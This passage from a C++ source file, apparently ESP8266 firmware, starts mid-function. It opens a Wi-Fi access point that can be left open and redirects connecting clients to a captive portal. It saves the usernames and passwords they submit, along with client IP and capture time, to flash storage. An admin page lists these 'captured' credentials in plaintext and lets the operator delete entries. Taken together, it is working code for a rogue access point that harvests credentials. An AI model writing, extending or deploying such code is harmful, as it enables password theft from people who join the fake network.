ecsistem/oled-esp8266/src/wifi_portal.cpp
    if (apOpen)
    {
      apStarted = WiFi.softAP(apSsid.c_str(), nullptr, 1, false, 4);
    }
    else
    {
      apStarted = WiFi.softAP(apSsid.c_str(), apPassword.c_str(), 1, false, 4);
    }

    if (!apStarted)
    {
      WiFi.softAP(apSsid.c_str());
    }

    applyCaptivePortalDnsState();
  }

  void handleCaptiveRedirect()
  {
    if (!captivePortalEnabled)
    {
      server.send(404, "text/plain; charset=utf-8", "Captive portal desativado");
      return;
    }

    server.sendHeader("Location", String("http://") + WiFi.softAPIP().toString() + "/", true);
    server.send(302, "text/plain", "");
  }

  bool appendCapturedCredential(const String &username, const String &password)
  {
    JsonDocument doc;

    if (LittleFS.exists(capturedCredentialsPath))
    {
      File existing = LittleFS.open(capturedCredentialsPath, "r");
      if (existing)
      {
        DeserializationError error = deserializeJson(doc, existing);
        existing.close();

        if (error || !doc.is<JsonArray>())
        {
          doc.clear();
        }
      }
    }

    if (!doc.is<JsonArray>())
    {
      doc.to<JsonArray>();
    }

    JsonArray entries = doc.as<JsonArray>();
    JsonObject entry = entries.add<JsonObject>();

    entry["username"] = username;
    entry["password"] = password;
    entry["captured_at_ms"] = millis();
    entry["client_ip"] = server.client().remoteIP().toString();

    while (entries.size() > 40)
    {
      entries.remove(0);
    }

    File out = LittleFS.open(capturedCredentialsPath, "w");
    if (!out)
    {
      return false;
    }

    bool ok = serializeJson(doc, out) > 0;
    out.close();
    return ok;
  }

  bool deleteCapturedCredentialByIndex(size_t index)
  {
    if (!LittleFS.exists(capturedCredentialsPath))
    {
      return false;
    }

    File file = LittleFS.open(capturedCredentialsPath, "r");
    if (!file)
    {
      return false;
    }

    JsonDocument doc;
    DeserializationError error = deserializeJson(doc, file);
    file.close();

    if (error || !doc.is<JsonArray>())
    {
      return false;
    }

    JsonArray entries = doc.as<JsonArray>();
    if (index >= entries.size())
    {
      return false;
    }

    entries.remove(index);

    File out = LittleFS.open(capturedCredentialsPath, "w");
    if (!out)
    {
      return false;
    }

    bool ok = serializeJson(doc, out) > 0;
    out.close();
    return ok;
  }

  bool clearCapturedCredentials()
  {
    JsonDocument doc;
    doc.to<JsonArray>();

    File out = LittleFS.open(capturedCredentialsPath, "w");
    if (!out)
    {
      return false;
    }

    bool ok = serializeJson(doc, out) > 0;
    out.close();
    return ok;
  }

  String buildCapturedCredentialsTable()
  {
    if (!LittleFS.exists(capturedCredentialsPath))
    {
      return "<p class='muted'>Nenhuma credencial capturada ainda.</p>";
    }

    File file = LittleFS.open(capturedCredentialsPath, "r");
    if (!file)
    {
      return "<p class='muted'>Falha ao abrir o arquivo de credenciais.</p>";
    }

    JsonDocument doc;
    DeserializationError error = deserializeJson(doc, file);
    file.close();

    if (error || !doc.is<JsonArray>())
    {
      return "<p class='muted'>Arquivo de credenciais vazio ou invalido.</p>";
    }

    JsonArray entries = doc.as<JsonArray>();
    if (entries.size() == 0)
    {
      return "<p class='muted'>Nenhuma credencial capturada ainda.</p>";
    }

    String html;
    html += "<div style='display:flex;flex-direction:column;gap:12px;margin-top:12px'>";

    for (size_t i = entries.size(); i > 0; i--)
    {
      JsonObject item = entries[i - 1];
      String username = item["username"] | "";
      String password = item["password"] | "";
      String ip = item["client_ip"] | "-";
      unsigned long capturedAt = item["captured_at_ms"] | 0;
      size_t entryIndex = i - 1;

      html += "<div style='background:#1f1f1f;border-left:4px solid #00a6ff;padding:16px;border-radius:8px'>";
      html += "<div style='display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:12px'>";

      html += "<div style='background:#262626;padding:12px;border-radius:6px;border-left:3px solid #00a6ff'>";
      html += "<span style='color:#aaa;font-size:11px;text-transform:uppercase;letter-spacing:0.5px'>Usuário</span>";
      html += "<div style='color:#00a6ff;font-size:14px;font-weight:bold;margin-top:6px;word-break:break-all'>" + escapeHtml(username) + "</div>";
      html += "</div>";

      html += "<div style='background:#262626;padding:12px;border-radius:6px;border-left:3px solid #ff7675'>";
      html += "<span style='color:#aaa;font-size:11px;text-transform:uppercase;letter-spacing:0.5px'>Senha</span>";
      html += "<div style='color:#ff7675;font-size:14px;font-weight:bold;margin-top:6px;word-break:break-all'>" + escapeHtml(password) + "</div>";
      html += "</div>";

      html += "</div>";
      html += "<div style='display:flex;justify-content:space-between;align-items:center;gap:12px'>";
      html += "<div style='flex:1;display:flex;gap:16px;font-size:12px'>";
      html += "<div><span style='color:#aaa'>IP:</span> <span style='color:#58d68d'>" + escapeHtml(ip) + "</span></div>";
      html += "<div><span style='color:#aaa'>Capturado:</span> <span style='color:#ffb347'>" + String(capturedAt) + " ms</span></div>";
      html += "</div>";
      html += "<form method='post' action='/credentials/delete' onsubmit=\"return confirm('Apagar este login?')\" style='margin:0'>";
      html += "<input type='hidden' name='index' value='" + String(entryIndex) + "'>";
      html += "<button type='submit' style='padding:8px 14px;border-radius:6px;border:0;background:#8b2d2d;color:#fff;cursor:pointer;font-weight:bold;white-space:nowrap;font-size:12px'>🗑️ Apagar</button>";
      html += "</form>";
      html += "</div>";
      html += "</div>";
    }

    html += "</div>";
    return html;
  }

  void handleDeleteCapturedCredential()
  {
    if (!server.hasArg("index"))
    {
      server.send(400, "text/plain; charset=utf-8", "Indice obrigatorio");
      return;
    }

    String rawIndex = server.arg("index");
    for (size_t i = 0; i < rawIndex.length(); i++)
    {
      if (!isDigit(rawIndex[i]))
      {
        server.send(400, "text/plain; charset=utf-8", "Indice invalido");
        return;
      }
    }

    size_t index = static_cast<size_t>(strtoul(rawIndex.c_str(), nullptr, 10));
    bool ok = deleteCapturedCredentialByIndex(index);

    if (!ok)
    {
      server.send(400, "text/plain; charset=utf-8", "Falha ao apagar credencial");
      return;
    }

    server.sendHeader("Location", "/admin", true);
    server.send(303, "text/plain", "");
  }

